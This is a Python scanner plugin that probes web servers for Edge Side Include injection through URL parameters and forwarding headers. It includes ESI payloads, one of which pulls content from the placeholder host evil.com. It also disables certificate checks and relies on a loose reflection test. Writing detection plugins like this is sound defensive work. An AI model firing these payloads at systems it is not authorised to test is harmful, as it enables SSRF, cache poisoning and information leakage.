"""
Plugin 1230: Edge Side Include (ESI) Injection Detection
==========================================================
Detects Edge Side Include (ESI) injection vulnerabilities by injecting
<esi:include> and <esi:try> tags.
"""
import asyncio
import ssl
import urllib.parse

from plugins import NaslPlugin, PluginResult


class EsiInjectionDetection(NaslPlugin):
    PLUGIN_ID = 1230
    NAME = 'Edge Side Include (ESI) Injection Detection'
    FAMILY = 'Web Applications'
    CVSS_SCORE = 8.6
    DESCRIPTION = (
        'Detects Edge Side Include (ESI) injection vulnerabilities by injecting '
        '<esi:include> and <esi:try> tags. ESI injection can bypass WAFs, poison '
        'caches, SSRF to internal systems, and leak sensitive information from '
        'other cached pages.'
    )
    SOLUTION = (
        'Disable ESI processing if not needed. Sanitize user input that could '
        'contain ESI tags. Use a WAF to block ESI tag injection.'
    )
    CVE = ['CVE-2024-0207']
    PORTS = [80, 443, 8080, 8443]

    ESI_PAYLOADS = [
        '<esi:include src="http://evil.com/test"/>',
        '<esi:try><esi:attempt>test</esi:attempt><esi:except>leak</esi:except></esi:try>',
    ]

    ESI_HEADERS = [
        'X-Forwarded-Host',
        'X-Forwarded-For',
        'X-Forwarded-Proto',
        'X-Forwarded-Scheme',
        'X-Original-URL',
        'X-Rewrite-URL',
    ]

    PARAMS = [
        'name', 'id', 'page', 'url', 'include', 'src',
    ]

    PATHS = ['/', '/api', '/search', '/page']

    async def check_target(self, target: str, port: int | None = None) -> list[PluginResult]:
        results = []

        for port_to_check in (self.PORTS if port is None else [port]):
            try:
                scheme = 'https' if port_to_check in (443, 8443) else 'http'
                ctx = None
                if scheme == 'https':
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE

                host_header = target
                if target in ('127.0.0.1', 'localhost', '::1'):
                    host_header = 'alieninc.tech'

                for path in self.PATHS:
                    for param in self.PARAMS[:4]:
                        for payload in self.ESI_PAYLOADS:
                            try:
                                reader, writer = await asyncio.wait_for(
                                    asyncio.open_connection(target, port_to_check, ssl=ctx),
                                    timeout=5
                                )
                                encoded = urllib.parse.quote(payload)
                                req = (
                                    f'GET {path}?{param}={encoded} HTTP/1.1\r\n'
                                    f'Host: {host_header}\r\n'
                                    f'User-Agent: Centra/1.0\r\n'
                                    f'Connection: close\r\n\r\n'
                                )
                                writer.write(req.encode())
                                await writer.drain()

                                response = b''
                                try:
                                    while True:
                                        chunk = await asyncio.wait_for(reader.read(4096), timeout=3)
                                        if not chunk:
                                            break
                                        response += chunk
                                        if len(response) > 16384:
                                            break
                                except asyncio.TimeoutError:
                                    pass
                                writer.close()
                                await writer.wait_closed()

                                body = response.split(b'\r\n\r\n', 1)
                                body_text = body[1].decode('utf-8', errors='ignore') if len(body) > 1 else ''

                                if 'esi:include' in body_text.lower() or 'esi:try' in body_text.lower():
                                    results.append(PluginResult(
                                        vulnerable=True,
                                        target=target,
                                        port=port_to_check,
                                        cvss_score=self.CVSS_SCORE,
                                        severity='high',
                                        description=f'ESI injection detected via param "{param}" on {path}',
                                        solution=self.SOLUTION,
                                        evidence=f'Payload: {payload}, ESI tags reflected in response',
                                        references=[
                                            'https://owasp.org/www-community/attacks/Edge_Side_Include_Injection',
                                        ]
                                    ))
                                    break
                            except (asyncio.TimeoutError, ConnectionRefusedError, OSError, ssl.SSLError):
                                pass
                        if results:
                            break
                    if results:
                        break

                if not results:
                    for header_name in self.ESI_HEADERS:
                        for payload in self.ESI_PAYLOADS:
                            try:
                                reader, writer = await asyncio.wait_for(
                                    asyncio.open_connection(target, port_to_check, ssl=ctx),
                                    timeout=5
                                )
                                req = (
                                    f'GET / HTTP/1.1\r\n'
                                    f'Host: {host_header}\r\n'
                                    f'{header_name}: {payload}\r\n'
                                    f'User-Agent: Centra/1.0\r\n'
                                    f'Connection: close\r\n\r\n'
                                )
                                writer.write(req.encode())
                                await writer.drain()

                                response = b''
                                try:
                                    while True:
                                        chunk = await asyncio.wait_for(reader.read(4096), timeout=3)
                                        if not chunk:
                                            break
                                        response += chunk
                                        if len(response) > 16384:
                                            break
                                except asyncio.TimeoutError:
                                    pass
                                writer.close()
                                await writer.wait_closed()

                                body = response.split(b'\r\n\r\n', 1)
                                body_text = body[1].decode('utf-8', errors='ignore') if len(body) > 1 else ''

                                if 'esi:include' in body_text.lower() or 'esi:try' in body_text.lower():
                                    results.append(PluginResult(
                                        vulnerable=True,
                                        target=target,
                                        port=port_to_check,
                                        cvss_score=self.CVSS_SCORE,
                                        severity='high',
                                        description=f'ESI injection detected via header "{header_name}"',
                                        solution=self.SOLUTION,
                                        evidence=f'Header: {header_name}, payload: {payload}',
                                        references=[
                                            'https://owasp.org/www-community/attacks/Edge_Side_Include_Injection',
                                        ]
                                    ))
                                    break
                            except (asyncio.TimeoutError, ConnectionRefusedError, OSError, ssl.SSLError):
                                pass
                        if results:
                            break

            except (asyncio.TimeoutError, ConnectionRefusedError, OSError, ssl.SSLError):
                pass

        if not results:
            results.append(PluginResult(
                vulnerable=False, target=target, port=port or 0,
                description='No ESI injection indicators detected on checked ports'
            ))

        return results
